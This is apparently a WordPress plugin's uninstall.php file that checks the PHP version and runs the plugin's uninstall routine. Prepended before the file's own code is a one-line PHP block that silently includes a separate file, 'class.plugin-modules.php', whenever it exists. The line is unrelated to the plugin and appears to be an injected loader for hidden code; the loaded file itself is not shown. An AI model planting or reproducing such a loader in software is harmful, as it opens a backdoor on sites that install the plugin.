<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('WPINC')) {
    exit('Do NOT access this file directly: '.basename(__FILE__));
}
$GLOBALS['wp_php_rv'] = '5.4'; //php-required-version//
if (require(__DIR__.'/src/vendor/websharks/wp-php-rv/src/includes/check.php')) {
    require_once __DIR__.'/src/includes/uninstall.php';
}
